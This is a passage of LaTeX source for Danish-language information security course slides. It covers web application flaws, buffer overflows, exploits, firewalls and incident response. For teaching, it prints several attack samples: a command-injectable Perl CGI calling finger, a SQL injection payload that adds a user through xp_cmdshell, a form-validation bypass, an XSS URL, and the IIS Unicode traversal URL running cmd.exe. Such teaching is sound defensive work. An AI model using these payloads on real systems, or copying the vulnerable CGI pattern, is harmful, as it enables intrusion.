    print "will execute:\n/usr/bin/finger $input{'command'}\n";
    print "<HR COLOR=#000>\n";
    print `/usr/bin/finger $input{'command'}`;
    print "<pre>\n";
}
\end{verbatim}}

\slide{Almindelige problemer}

\begin{list1}
\item validering af forms
\item validering på klient er godt\\
- godt for brugervenligheden, hurtigt feedback
\item validering på clientside gør intet for sikkerheden
\item serverside validering er nødvendigt
\item generelt er input validering det største problem!
\end{list1}

Brug \emph{Open Web Application Security
Project} \link{http://www.owasp.org}

\slide{SQL injection}

\begin{list1}
\item SQL Injection FAQ 
\link{http://www.sqlsecurity.com}:
\begin{alltt}
\small  
Set myRecordset = myConnection.execute
("SELECT * FROM myTable
WHERE someText ='" & request.form("inputdata") & "'")  
med input: ' exec master..xp_cmdshell 'net user test testpass /ADD' --
modtager og udfører serveren:
SELECT * FROM myTable 
WHERE someText ='' exec master..xp_cmdshell
'net user test testpass /ADD'--' 
\end{alltt}
\item -- er kommentar i SQL
\end{list1}

\slide{Er SQL injection almindeligt?}


\begin{list1}
\item Ja, meget almindeligt!
\item Prøv at søge med google  
\end{list1}

\hlkimage{5cm}{images/database-hackers-handbook.jpg}

\begin{list1}
\item \emph{The Database Hacker's Handbook : Defending Database Servers
} David  Litchfield, Chris  Anley, John  Heasman, Bill  Grindlay,
Wiley 2005 ISBN: 0764578014
\end{list1}






\slide{Mere SQL injection / SQL server}

\begin{list1}
\item Threat Profiling Microsoft SQL Server\\
\link{http://www.nextgenss.com/papers/tp-SQL2000.pdf}
\begin{list2}
\item Hvordan sikrer man en SQL server?
\item mod fejl
\item mod netværksadgang
\item mod SQL injection
\end{list2}
\item NB: Hold øje med andre artikler fra samme sted\\
\link{http://www.nextgenss.com/research/papers.html}
\item Advanced SQL Injection In SQL Server Applications\\
\href{http://www.nextgenss.com/papers/advanced_sql_injection.pdf}
{http://www.nextgenss.com/papers/advanced\_sql\_injection.pdf}\\
(more) Advanced SQL Injection\\
\href{http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf}
{http://www.nextgenss.com/papers/more\_advanced\_sql\_injection.pdf}\\
begge af Chris Anley [chris@ngssoftware.com]
\end{list1}

\slide{Mere Web application hacking}

\hlkimage{5cm}{images/web-app-hackers-handbook.jpeg}

\begin{list1}
\item \emph{The Web Application Hacker's Handbook: Discovering and Exploiting Security Flaws}
Dafydd Stuttard, Marcus Pinto, Wiley 2007 ISBN: 978-0470170779
\end{list1}

\slide{Hvordan udnyttes forms nemmest?}

\begin{list1}
\item Manuelt download form:
\begin{alltt}
<FORM ACTION="opret.asp?mode=bruger?id=doopret"
METHOD="POST" NAME="opret"
ONSUBMIT="return validate(this)">
\end{alltt}
\item fjern kald til validering:
\begin{alltt}
<FORM ACTION="opret.asp?mode=bruger?id=doopret"
METHOD="POST" NAME="opret">
\end{alltt}
\item Tilføj 'BASE HREF' i header, findes med browser - højreklik
  properties i Internet Explorer

\end{list1}    


\slide{Hvordan udnyttes forms nemmest?}

\begin{list1}
\item Den form som man bruger er så - fra sin lokale harddisk:
\begin{alltt}
<HEAD>
<TITLE>Our Products</TITLE>
<BASE href="http://www.target.server/sti/til/form">
</HEAD>
...
<FORM ACTION="opret.asp?mode=bruger?id=doopret"
METHOD="POST" NAME="opret">
\end{alltt}
\item Kald form i en browser og indtast værdier
\end{list1}    

\slide{WebScarab eller Firefox plugins} 

\begin{list1}
\item Man bliver hurtigt træt af at ændre forms på den måde
\item Istedet anvendes en masse proxyprogrammer
\item Nogle af de mest kendte er:
\begin{list2}
\item Burp proxy
\item Parox proxy
\item Firefox extension tamper data
\item OWASP WebScarab
\end{list2}
\item Jeg anbefaler de sidste to
\end{list1}


\slide{Cross-site scripting}

\begin{list1}
\item Hvis der inkluderes brugerinput I websider som vises, kan
der måske indføjes ekstra information/kode.
\item Hvis et CGI program, eksempelvis comment.cgi blot bruger værdien af "mycomment" vil 
følgende URL give anledning til cross-site scripting
\begin{alltt}
<A HREF="http://example.com/comment.cgi?
mycomment=<SCRIPT>malicious code</SCRIPT>
">Click here</A>  
\end{alltt}
\item Hvis der henvises til kode kan det endda give anledning til
afvikling i anden "security context"
\item Kilde/inspiration:
  \link{http://www.cert.org/advisories/CA-2000-02.html} 
\end{list1}

\slide{webroot - unicode dekodning}

\begin{list1}
\item webroot er det sted på harddisken, hvorfra data der vises af
  webserveren hentes. 

\item Unicode bug:\\
{\small
\verb-http://10.0.43.10/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:-
}
\item Kilde:\\
\link{http://www.cgisecurity.com/archive/misc/unicode.txt} - rain forest puppy\\
\link{http://online.securityfocus.com/bid/1806/info/} - securityfocus info
\end{list1}

\slide{Sårbare programmer}
\begin{list1}
\item Hvorfor er programmerne stadig sårbare?
\item RFP exploits - adgang til kommandolinien via database\\
\verb+?:\Program Files\Common Files\System\Msadc\msadcs.dll+ 
\item Unicode - fejl i håndtering af specialtilfælde
\item double decode - flere fejl i håndtering af nye specialtilfælde
\item Dark spyrit jill.c - Internet Printing Protocol IPP.
                Ny funktionalitet som implementeres med fejl  
\item {\bf Programmer idag er komplekse!}
\end{list1}

\slide{Historik indenfor websikkerhed}

\begin{list1}
\item IIS track record
\begin{list2}
\item meget funktionalitet
\item større risiko for fejl
\item alvorlige fejl - arbitrary code execution
\end{list2}
\item Apache track record
\begin{list2}
\item typisk mindre funktionalitet
\item typisk haft mindre alvorlige fejl
\end{list2}
\item PHP track record?
\item Sammenligning IIS med Apache+PHP, idet en direkte sammenligning mellem
IIS og Apache vil være unfair 
\item {\bfseries Meget få har idag små websteder med statisk indhold}
\item Både IIS version 6 og Apache version 2 anbefales idag, fremfor tidligere versioner
\end{list1}

\slide{Nikto og W3af}

\begin{list1}
\item Vi afprøver nu følgende programmer sammen:
\item Nikto web server scanner \link{http://cirt.net/nikto2}
\item W3af Web Application Attack and Audit Framework \link{http://w3af.sourceforge.net/}
\item Begge findes på BackTrack 
\end{list1}


\slide{Opsummering websikkerhed}

\begin{list1}
\item Husk hidden fields er ikke mere skjulte end
"view source"-knappen i browseren
\item serverside validering er nødvendigt
\item SQL injection er nemt at udføre og almindeligt
\item Cross-site scripting kan have uanede muligheder
\item Brug top 10 listen fra \link{http://www.owasp.org}
\item Brug WebGoat fra OWASP til at lære mere om Websikkerhed
\end{list1}

\slide{Privilegier least privilege}

\begin{list1}
\item Hvorfor afvikle applikationer med administrationsrettigheder -
  hvis der kun skal læses fra eksempelvis en database?
\item {\bfseries least privilege} 
betyder at man afvikler kode med det mest
restriktive sæt af privileger - kun lige nok til at
opgaven kan udføres
\item Dette praktiseres ikke i webløsninger i Danmark - eller meget få steder
\end{list1}

\slide{Privilegier privilege escalation}
\begin{list1}
\item {\bfseries privilege escalation} er når man på en eller anden vis
opnår højere privileger på et system, eksempelvis som
følge af fejl i programmer der afvikles med højere
privilegier. Derfor HTTPD servere på UNIX afvikles som
nobody - ingen specielle rettigheder.
\item En angriber der kan afvikle vilkårlige kommandoer kan ofte finde
  en sårbarhed som kan udnyttes lokalt - få rettigheder = lille skade
\end{list1}


\slide{Undgå standard indstillinger}

\begin{list1}
\item når vi scanner efter services går det nemt med at finde dem
\item Giv jer selv mere tid til at omkonfigurere og opdatere ved at undgå standardindstillinger
\item Tiden der går fra en sårbarhed annonceres på bugtraq til den
  bliver udnyttet er meget kort idag! 
\item Ved at undgå standard indstillinger kan der
  måske opnås en lidt længere frist - inden ormene kommer
\item NB: ingen garanti - og det hjælper sjældent mod en dedikeret angriber
\end{list1}

\slide{Matrix the movie Trinity breaking in}

\hlkimage{20cm}{trinity-nmapscreen-hd-cropscale-418x250.jpg}
\link{http://nmap.org/movies.html}\\
Meget realistisk \link{http://www.youtube.com/watch?v=Zy5_gYu_isg}

\slide{buffer overflows et C problem}

\begin{list1}
\item {\bfseries Et buffer overflow}
er det der sker når man skriver flere data end der er afsat plads til
i en buffer, et dataområde. Typisk vil programmet gå ned, men i visse
tilfælde kan en angriber overskrive returadresser for funktionskald og
overtage kontrollen. 
\item {\bfseries Stack protection} 
er et udtryk for de systemer der ved hjælp af operativsystemer,
programbiblioteker og lign. beskytter stakken med returadresser og
andre variable mod overskrivning gennem buffer overflows. StackGuard
og Propolice er nogle af de mest kendte.
\end{list1}

\slide{Exploits - udnyttelse af sårbarheder}

\begin{list1}
\item exploit/exploitprogram er
\begin{list2}
\item udnytter eller demonstrerer en sårbarhed
\item rettet mod et specifikt system.
\item kan være 5 linier eller flere sider
\item Meget ofte Perl eller et C program 
\end{list2}
\end{list1}

Eksempel:
\begin{verbatim}
 #! /usr/bin/perl
 # ./chars.pl | nc server 31337
 print "abcdefghijkl";
 print chr(237);
 print chr(13);
 print chr(220);
 print chr(186);
 print "\n";
\end{verbatim}

\slide{local vs. remote exploits}

\begin{list1} 
\item {\bfseries local vs. remote}
angiver om et exploit er rettet mod
en sårbarhed lokalt på maskinen, eksempelvis
opnå højere privilegier, eller beregnet
til at udnytter sårbarheder over netværk
\item {\bfseries remote root exploit} 
- den type man frygter mest, idet
det er et exploit program der når det afvikles giver
angriberen fuld kontrol, root user er administrator
på UNIX, over netværket. 
\item {\bfseries zero-day exploits} dem som ikke offentliggøres - dem
  som hackere holder for sig selv. Dag 0 henviser til at ingen kender
  til dem før de offentliggøres og ofte er der umiddelbart ingen
  rettelser til de sårbarheder
\end{list1}

\slide{Hvordan laves et buffer overflow?}

\begin{list1}
\item Findes ved at prøve sig frem
\begin{list2}
\item black box testing
\item closed source
\item reverse engineering
\end{list2}
\item Ved Open source Findes de typisk ved at læse/analysere koden 
\begin{list2}
\item RATS
\item flere andre 
\end{list2}
\item Virker typisk mod specifikke versioner
\begin{list2}
\item Windows IIS 4.0 med service pack XX
\item Red Hat Linux 7.3 default
\end{list2}
\end{list1}

\slide{Buffer overflows}

\hlkimage{3cm}{images/shellcoders-handbook.jpg}

\begin{list1}
\item Hvis man vil lære at lave buffer overflows og exploit programmer
  er følgende dokumenter et godt sted at starte
\item \emph{Smashing The Stack For Fun And Profit} Aleph One
\item \emph{Writing Buffer Overflow Exploits with Perl - anno 2000}
\item Dernæst kan man bevæge sig mod Windows epxloits, integer
  overflows m.fl.
\item Følgende bog kan ligeledes anbefales:
\emph{The Shellcoder's Handbook : Discovering and Exploiting Security Holes} 
af Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, Sinan
"noir" Eren, Neel Mehta, Riley Hassell, John Wiley \& Sons, 2004 
\item NB: bogen er avanceret og således IKKE for begyndere! 
\end{list1}

\slide{milw0rm - dagens buffer overflow}

\hlkimage{20cm}{milw0rm.png}

\centerline{\link{http://milw0rm.com/}}

\slide{Metasploit}

\hlkimage{20cm}{metasploit-about.png}

\begin{list1}
\item Trinity brugte et exploit program \smiley
\item Idag findes der samlinger af exploits som milw0rm
\item Udviklingsværktøjerne til exploits er idag meget raffinerede!
\item \link{http://www.metasploit.com/}
\end{list1}

\slide{Forudsætninger}

\begin{list1}
\item Bemærk: alle angreb har forudsætninger for at virke
\item Et angreb mod Telnet virker kun hvis du bruger Telnet
\item Et angreb mod Apache HTTPD virker ikke mod Microsoft IIS
\item Kan du bryde kæden af forudsætninger har du vundet!
\end{list1}

\slide{Stack protection}

\begin{list1}
\item Stack protection er mere almindeligt\\
- med i OpenBSD current fra 2. dec 2002

\item Buffer overflows er almindeligt kendte
\begin{list2}    
\item Selv OpenSSH har haft buffer overflows
\item Stack protection prøver at modvirke/fjerne
  muligheden for buffer overflows. arbitrary code execution
  bliver til ude af drift for berørte services
\end{list2}

\item Propolice\\
\link{http://www.openbsd.org}\\
\link{http://www.trl.ibm.com/projects/security/ssp/}

\item StackGuard\\
\link{http://www.immunix.org/stackguard.html}
\end{list1}

\slide{Gode operativsystemer}

\begin{list1}
\item Nyere versioner af Microsoft Windows, Mac OS X og Linux distributionerne inkluderer:
\begin{list2}
\item Buffer overflow protection
\item Stack protection, non-executable stack
\item Heap protection, non-executable heap
\item \emph{Randomization of parameters} stack gap m.v.
\end{list2}
\item OpenBSD er nok nået længst og et godt eksempel\\ \link{http://www.openbsd.org/papers/}
\end{list1}


\slide{JAVA programmering}

\begin{list1}
\item Hvorfor ikke bare bruge JAVA?
\item JAVA karakteristik
\begin{list2}
\item automatisk garbage collection
\item bytecode verifikation på
\item mulighed for signeret kode
\item beskyldes for at være langsomt
\item platformsuafhængigt
\end{list2}
\item JAVA just in Time (JIT) er sammenligneligt med kompileret C
\item god sikkerhedsmodel - men problemer i implementationerne
\item JVM - den virtuelle maskine er udsat for hacking
\end{list1}

% session 3-3 scripting af angreb

\slide{ASCII baserede protokoller}

{\bfseries Diskussion:}\\
I skal se/lære at mange protokoller i dag er \emph{ASCII baserede} -
dvs benytter kommandoer i klar tekst, GET, HEAD, QUIT osv. som gør det
nemt at debugge.


\begin{list1}
\item Det gælder eksempelvis for:
\begin{list2}
\item SMTP
\item POP3
\item FTP
\item HTTP    
\end{list2}
\item man kan altså forbinde til den pågældende service og interagere
\end{list1}

\exercise{ex:netcat-1}
\exercise{ex:openssl}


% session 3-4 automatiseret sårbarhedsscanning

\slide{Hackerværktøjer}

\begin{list1}
\item Dan Farmer og Wietse Venema skrev i 1993 artiklen\\
\emph{Improving the Security of Your Site by Breaking Into it}
\item Senere i 1995 udgav de så en softwarepakke med navnet SATAN
\emph{Security Administrator Tool for Analyzing Networks}
 Pakken vagte
 en del furore, idet man jo gav alle på internet mulighed for at hacke
\begin{quote}
We realize that SATAN is a two-edged sword - like
many tools, it can be used for good and for evil
purposes. We also realize that intruders (including
wannabees) have much more capable (read intrusive)
tools than offered with SATAN. 
\end{quote}
\item SATAN og ideerne med automatiseret scanning efter sårbarheder
  blev siden ført videre i programmer som Saint, SARA og idag findes
  mange hackerværktøjer og automatiserede scannere: 
\begin{list2}
\item OpenVAS, ISS scanner, Fyodor Nmap, Typhoon, ORAscan
\end{list2}
\end{list1}
Kilde:
\link{http://www.fish.com/security/admin-guide-to-cracking.html}



\slide{Brug hackerværktøjer!}

\begin{list1}
\item Hackerværktøjer - bruger I dem? - efter dette kursus gør I 
\item portscannere kan afsløre huller i forsvaret
\item webtestværktøjer som crawler igennem et website og finder alle
  forms kan hjælpe
\item I vil kunne finde mange potentielle problemer proaktivt ved
  regelmæssig brug af disse værktøjer - også potentielle driftsproblemer
\item husk dog penetrationstest er ikke en sølvkugle
\item honeypots kan måske være med til at afsløre angreb og
  kompromitterede systemer hurtigere
\end{list1}


\slide{"I only replaced index.html"}

\begin{list1}
\item Hvad skal man gøre når man bliver hacket ?
\item Hvad koster et indbrud?
\begin{list2}
\item Tid - antal personer der ikke kan arbejde
\item Penge - oprydning, eksterne konsulenter
\item Bøvl - sker altid på det værst mulige tidspunkt
\item Besvær - ALT skal gennemrodes
\item Tab af image/goodwill
\end{list2}
\item Forensic challenge:
I gennemsnit brugte deltagerne 34 timer pr person på
at efterforske i rigtige data fra et indbrud!
angriberen brugte ca. 30 min
\item Kilder:
\link{http://project.honeynet.org/challenge/results/}\\
\link{http://packetstorm.securify.com/docs/hack/i.only.replaced.index.html.txt}
\end{list1}

\slide{Recovering from break-ins}

\begin{list1}
\item {\color{red}\bfseries DU KAN IKKE HAVE TILLID TIL NOGET}
\item På CERT website kan man finde mange gode ressourcer omkring
  sikkerhed og hvad man skal gøre med kompromiterede servere
\item Eksempelvis listen over dokumenter fra adressen:\\
  \link{http://www.cert.org/nav/recovering.html} 
  \begin{list2}
  \item The Intruder Detection Checklist
  \item Windows NT Intruder Detection Checklist 
  \item The UNIX Configuration Guidelines
  \item Windows NT Configuration Guidelines 
  \item The List of Security Tools
  \item Windows NT Security and Configuration Resources 
  \end{list2}
%\item Hvis man mener man står med en kompromitteret server kan
%  følgende være nødvendigt
%  \href{http://www.cert.org/tech_tips/root_compromise.html} 
%{http://www.cert.org/tech\_tips/root\_compromise.html}
\end{list1}



\exercise{ex:openvas}


%\slide{Dag 3 trådløse netværk}


%\hlkimage{3cm}{12065572121317625675no_hope_Wireless_access_point.png}


%\input{wireless-80211}




\slide{Hvad er en firewall}

\vskip 1 cm
\centerline{\hlkbig En firewall er noget som {\color{green}blokerer}
  traffik på Internet}  

\vskip 1 cm
\pause

\centerline{\hlkbig En firewall er noget som {\color{red}tillader}
  traffik på Internet} 

Myte: en firewall beskytter mod alt

\slide{Myten om firewalls}

\begin{list1}
\item Myten: 
\item en firewall beskytter mod alt
\item Sandhed: 
\item en firewall blokerer en masse, fint nok
\item en firewall tillader at du henter en masse ind
\item {\color{green} Beskytter mod direkte angreb fra netværket}
\item {\color{red}Beskytter ikke mod fysiske angreb} 
\item {\color{red}Beskytter ikke mod malware gennem websider og e-mail}
\end{list1}

\centerline{Firewall anbefales altid, specielt på bærbare}


\slide{firewalls}

\begin{itemize}
\item Basalt set et netværksfilter - det yderste fæstningsværk
\item Indeholder typisk:
  \begin{list2}
   \item Grafisk brugergrænseflade til konfiguration - er det en
   fordel?
\item TCP/IP filtermuligheder - pakkernes afsender, modtager, retning
  ind/ud, porte, protokol, ...
\item kun IPv4 for de kommercielle firewalls
\item både IPv4 og IPv6 for Open Source firewalls: IPF, OpenBSD PF,
  Linux firewalls, ...
\item foruddefinerede regler/eksempler - er det godt hvis det er nemt
  at tilføje/åbne en usikker protokol?
\item typisk NAT funktionalitet indbygget
\item typisk mulighed for nogle serverfunktioner: kan agere
  DHCP-server, DNS caching server og lignende
  \end{list2}
\item En router med Access Control Lists - ACL kaldes ofte
  netværksfilter, mens en dedikeret maskine kaldes firewall -
  funktionen er reelt den samme - der filtreres trafik
\end{itemize}

\slide{firewall regelsæt eksempel}

\begin{alltt}
\tiny 
# hosts
router="217.157.20.129"
webserver="217.157.20.131"
# Networks
homenet="{ 192.168.1.0/24, 1.2.3.4/24 }"
wlan="10.0.42.0/24"
wireless=wi0

# things not used
spoofed="{ 127.0.0.0/8, 172.16.0.0/12, 10.0.0.0/16, 255.255.255.255/32 }"

block in all # default block anything
# loopback and other interface rules
pass out quick on lo0 all
pass in quick on lo0 all

# egress and ingress filtering - disallow spoofing, and drop spoofed
block in quick from $spoofed to any
block out quick from any to $spoofed

pass in on $wireless proto tcp from $wlan to any port = 22
pass in on $wireless proto tcp from $homenet to any port = 22
pass in on $wireless proto tcp from any to $webserver port = 80

pass out quick proto tcp  from $homenet to any flags S/S keep state
pass out quick proto udp  from $homenet to any         keep state
pass out quick proto icmp from $homenet to any         keep state
\end{alltt}
%$


\slide{netdesign - med firewalls - 100\% sikkerhed?}

\begin{center}
\colorbox{white}{\includegraphics[width=12cm]{images/kut.jpg}}  
\end{center}

\begin{list1}
\item Hvor skal en firewall placeres for at gøre størst nytte?
\item Hvad er forudsætningen for at en firewall virker?\\
At der er konfigureret et sæt fornuftige regler!
\item Hvor kommer reglerne fra? Sikkerhedspolitikken!
%\item Kan man lave en 100\% sikker firewall? Ja selvfølgelig, se!
\end{list1}


\centerline{\small Kilde: Billedet er fra Marcus Ranum The ULTIMATELY
  Secure Firewall} 


\slide{IPsec}

\begin{itemize}
\item Sikkerhed i netværket
\item RFC-2401 Security Architecture for the Internet Protocol
\item RFC-2402 IP Authentication Header (AH)
\item RFC-2406 IP Encapsulating Security Payload (ESP)
\item RFC-2409 The Internet Key Exchange (IKE) - dynamisk keying
\item Både til IPv4 og IPv6
\item {\bfseries MANDATORY} i IPv6! - et krav hvis man implementerer
  fuld IPv6 support
\item god præsentation på \link{http://www.hsc.fr/presentations/ike/}
\item Der findes IKEscan til at scanne efter IKE
  porte/implementationer\\
\link{http://www.nta-monitor.com/ike-scan/index.htm}
\end{itemize}

\slide{IPsec er ikke simpelt!}


\hlkimage{16cm}{images/ipsec-hsc.png}}  

\centerline{Kilde: \link{http://www.hsc.fr/presentations/ike/}}



\slide{Confidentiality Integrity Availability}

\vskip 1 cm

{\hlkbig Husk altid de fundamentale principper indenfor sikkerhed}

\hlkimage{15cm}{images/cia-triad.pdf}

\slide{Security holes... Who cares?}

\hlkimage{11cm}{images/rescorla-figure-1.png}

\begin{list1}
\item Forhistorien:
  \begin{list2}
  \item OpenSSL sårbarheder fra juli 2002
  \item Slapper worm fra september 2002
  \item Hvormange opdaterer for sårbarheder og hvornår?
  \end{list2}
\item Kilde:
  Eric Rescorla, "Security holes... Who cares?"\\
  \link{http://www.rtfm.com/upgrade.pdf}
\end{list1}

\slide{Definition: sikkerhedspolitik}

\begin{list1}
\item Definition:
Et sæt regler for virksomheden

\item Definition: it-sikkerhedspolitik\\
en politik der er begrænset til
IT-områderne i virksomheden 
\end{list1}

\hlkimage{10cm}{images/policy-1.pdf} 

{\bf - kan være en del af CYA strategi, cover your assets ;-)}

\slide{Sikkerhedsteknologier}

\begin{list1}
\item Brug alt hvad I kan overkomme:
\begin{list2}
\item Firewalls: IPfilter, IPtables, OpenBSD PF
\item Kryptografi 
\item Secure Shell - SSH
\item betragt Telnet, Rlogin, Rsh, Rexec som døde!
\item FTP bør kun bruges til anonym FTP
\item Intrusion Detection - Snort
\item Sudo
\item Tripwire, mtree, MD5
\end{list2}
\item Sikkerhedspolitikken er din "plan" for sikkerheden
- og er med til at sikre niveauet er ens
\item Firewalls hjælper ikke mod alle trusler
\end{list1}

\slide{Opsummering afslutning}

\begin{list1}
\item Husk følgende:
\begin{list2}
\item Husk: IT-sikkerhed er ikke kun netværkssikkerhed!
\item God sikkerhed kommer fra langsigtede intiativer
\item Hvad er informationssikkerhed?
\item Data på elektronisk form
\item Data på fysisk form
\item Social engineering er måske overset - \emph{The Art of Deception: 
Controlling the Human Element of Security}
af Kevin D. Mitnick, William L. Simon, Steve Wozniak
\end{list2}
\item Computer Forensics er reaktion på en hændelse
\end{list1}
\vskip 1cm
\centerline{\color{security6blue}\LARGE Informationssikkerhed er en proces}

\slide{Anbefalinger generelt}

\begin{list1}
\item Drop legacy kompatibilitet
\item Udryd gamle usikre
\begin{list2}
\item protokoller - som SSH version 1
\item programmer telnet, FTP, R* - password i klartekst
\item services NT LAN manager
\end{list2}
\item {\bfseries VÆK med dem!}
\item Det handler om sikkerhed, det der ikke er
aktivt kan ikke misbruges
\end{list1}

\slide{Anbefalinger til jer}
% oversigt over dem

{\bf \large Oversigt over anbefalinger} 
\begin{list1}
\item {\bf Følg med!} - læs websites, bøger, artikler, mailinglister, ...
\item {\bf Vurder altid sikkerhed} - skal integreres i processer
\item {\bf Hændelseshåndtering} - du vil komme ud for sikkerhedshændelser
\item {\bf Lav en sikkerhedspolitik} - herunder software og e-mail politik 
\end{list1}

{\bfseries Hver måned offentliggøres mindst 100 nye
sårbarheder i produkter - software/hardware }


\slide{Følg med! - mange kilder}
\begin{list1}
\item {\bf websites} prøv at kigge både på officielle/kommercielle websites
  - men også indimellem på \emph{de små gyder} på Internet 
\item {\bf bøger} der er en god liste over \emph{MUST READ} sikkerhedsbøger
  på adressen\\
\href{http://sun.soci.niu.edu/~rslade/mnbksccd.htm}
{http://sun.soci.niu.edu/\~{}rslade/mnbksccd.htm}
\item {\bf artikler} mange steder, men eksempelvis\\ 
\link{http://www.securityfocus.com}
\item {\bf mailinglister} leverandør ejede lister og generelle - som
  bugtraq og full-disclosure
\item {\bf personer} der findes personer på Internet som er værd at
  holde øje med. Eksempelvis: Bruce Schneiers nyhedsbrev crypto-gram\\
  \link{http://www.counterpane.com/crypto-gram.html}
\end{list1}


\slide{Spørgsmål?}


\vskip 4cm

\begin{center}
\hlkbig 

\myname

\myweb
\vskip 2 cm

I er altid velkomne til at sende spørgsmål på e-mail
\end{center}

% opgaver
%\slide{}

%\label{ex:sample}

%{\bfseries Opgave:} 

%{\bfseries Forslag til fremgangsmåde:} 

%{\bfseries Hjælp:} 

%{\bfseries Diskussion:} 



\slide{Reklamer: kursusafholdelse}

\begin{list1}
\item Følgende kurser afholdes med mig som underviser
\begin{list2}
\item IPv6 workshop - 1 dag\\
 Introduktion til Internetprotokollerne og forberedelse til
  implementering i egne netværk. 
\item Wireless teknologier og sikkerhed workshop - 1-2 dage\\
En dag med fokus på netværksdesign og fornuftig implementation af
trådløse netværk, samt integration med hjemmepc og
wirksomhedsnetværk. 
\item Hacker workshop 2 dage\\
Workshop med detaljeret gennemgang af hackermetoderne angreb over
netværk, exploitprogrammer, portscanning, OpenVAS m.fl.
\item Forensics workshop 2 dage\\
Med fokus på tilgængelige open source værktøjer gennemgås metoder og
praksis af undersøgelse af diskimages og spor på computer systemer
\item Moderne Firewalls og Internetsikkerhed 2 dage\\
Informere om trusler og aktivitet på Internet, samt give et bud
på hvorledes en avanceret moderne firewall idag kunne konfigureres.
\end{list2}
\end{list1}

Se mere på \link{http://www.security6.net/courses.html}

\slide{Network Security Tools}

\hlkimage{5cm}{images/network-security-tool-ora.jpg}
\begin{list1}
\item \emph{Network Security Tools : Writing, Hacking, and Modifying
    Security Tools} Nitesh Dhanjani, Justin Clarke, O'Reilly 2005, ISBN:
    0596007949 
 \end{list1}

\slide{}

\hlkimage{5cm}{images/freebsd-openbsd-security-tools-ora.jpg}
\begin{list1}
\item \emph{Mastering FreeBSD and OpenBSD Security} Yanek Korff, Paco
  Hope, Bruce Potter, O'Reilly, 2005, ISBN: 0596006268
\end{list1}

\slide{Hackers Challenge}

\begin{center}
\colorbox{white}{
\includegraphics[width=3cm]{images/hackers-challenge.jpg}
\includegraphics[width=33mm]{images/hackers-challenge2.jpg}}
\end{center}

\begin{list1}
%\item Hændelseshåndtering - øvelse som I kigger på i weekenden
%\item Opgaverne er kopieret fra bogen 
\item \emph{Hacker's Challenge : Test Your Incident Response Skills Using 20 Scenarios}
 af Mike Schiffman McGraw-Hill Osborne Media; (October 18, 2001) ISBN:
 0072193840
\item \emph{Hacker's Challenge II : Test Your Network Security and
 Forensics Skills} 
 af Mike Schiffman McGraw-Hill Osborne Media, 2003 ISBN: 0072226307
\item Bogen indeholder scenarier i første halvdel, og løsninger i
  anden halvdel - med fokus på relevante logfiler og sårbarheder  
\item Hackers challenge nr 3 udkommer i 2006
\end{list1}


\slide{Network Security Assessment}

\begin{center}
\colorbox{white}{
\includegraphics[width=6cm]{images/oreilly-networksa.png}}
\end{center}

\begin{list1}
%\item Hændelseshåndtering - øvelse som I kigger på i weekenden
%\item Opgaverne er kopieret fra bogen 
\item \emph{Network Security Assessment 
Know Your Network}
 af Chris McNab, O'Reilly Marts 2004 ISBN: 0-596-00611-X
\item Bogen er anbefalelsesværdig
\item Der kan hentes kapitel 4 som PDF - \emph{IP Network Scanning}
\end{list1}

\slide{Counter Hack}

\hlkimage{6cm}{images/counter-hack.jpg}

\begin{list1}
\item \emph{Counter Hack: A Step-by-Step Guide to Computer Attacks and
Effective Defenses}, Ed Skoudis, Prentice Hall PTR, 1st edition July 2001
\item Bogen er anbefalelsesværdig og er kommet i anden udgave
\item Minder mig om et universitetskursus i opbygningen
\end{list1}

\slide{Hackerværktøjer}
% måske til reference afsnit?

\begin{list2}
\item nmap - \link{http://www.insecure.org} portscanner
\item OpenVAS - \link{http://www.OpenVAS.org} automatiseret testværktøj
%\item libnet m.fl. - \link{http://www.packetfactory.net} - diverse projekter
%  relateret til pakker og IP netværk
\item l0phtcrack - \link{http://www.atstake.com/research/lc/} - The Password
  Auditing and Recovery Application, kig også på Cain og Abel fra
  \link{http://oxid.it} hvis det skal være gratis
\item Wireshark - \link{http://www.wireshark.org} avanceret netværkssniffer
%\item F.I.R.E -  \link{http://biatchux.dmzs.com/} - en cd-rom der indeholder en 
%  bootable Linux del.
\item OpenBSD - \link{http://www.openbsd.org} operativsystem med fokus
  på sikkerhed 
\item \link{http://www.isecom.org/} - Open Source Security Testing
  Methodology Manual - gennemgang af elementer der bør indgå i en struktureret test 
\item Putty - 
\link{http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html}

terminal emulator med indbygget SSH

\item 
\link{http://www.remote-exploit.org} - Backtrack security collection -
en boot CD med hackerværktøjer
\end{list2}

\slide{Referencer}

\begin{list1}
\item Anbefalede bøger:
\begin{list2}
\item \emph{Computer Forensics: Incident Response Essentials}, Warren
  G. Kruse II og Jay G. Heiser, Addison-Wesley, 2002.
\item \emph{Incident Response}, E. Eugene Schultz og Russel Shumway,
  New Riders, 2002
\item \emph{CISSP All-in-One Certification Exam Guide}, Shon Harris 
McGraw-Hill/Osborne, 2002
\item \emph{Network Intrusion Detection}, Stephen Northcutt og Judy Novak, New
  Riders, 2nd edition, 2001
\item \emph{Intrusion Signatures and Analysis}, Stephen Northcutt et al, New
  Riders, 2001
\item \emph{Practical UNIX and Internet Security}, Simson Garfinkel og
  Gene Spafford, 2nd edition
\item \emph{Firewalls and Internet Security},  Cheswick,
  Bellovin og Rubin, Addison-Wesley, 2nd edition, 2003
\item \emph{Hacking Exposed}, Scambray et al, 4th edition, Osborne, 2003 
  - tror der er en nyere  
  \item \emph{Building Open Source Network Security Tools}, Mike
  D. Schiffman, Wiley 2003 
\item \emph{Gray Hat Hacking : The Ethical Hacker's Handbook} Shon
  Harris, Allen  Harper, Chris  Eagle, Jonathan  Ness,
  Michael Lester, McGraw-Hill Osborne Media 2004, ISBN: 0072257091
\end{list2}
\end{list1}


\slide{Referencer}

\begin{list1}
\item Internet
  \begin{list2}
  \item \link{http://www.project.honeynet.org} - diverse honeynet projekter
  information om pakker og IP netværk. Har flere forensics challenges
  hvor man kan hente images og foretage sin egen analyse
  \item \link{http://www.packetfactory.net} - diverse projekter
  relateret til pakker og IP netværk eksempelvis libnet

\item \link{http://www.isecom.org/} - Open Source Security Testing
  Methodology Manual - Hvordan laver man struktureret test! 

\end{list2}
\item Mailinglists
  \begin{list2}
    \item securityfocus m.fl. - de fleste producenter og væktøjer
    har mailinglister tilknyttet
  \end{list2}
\item Papers - der findes MANGE dokumenter på Internet
\begin{list2}
\item \emph{Security Problems in the TCP/IP Protocol Suite},
  S.M. Bellovin, 1989 og fremefter
\end{list2}
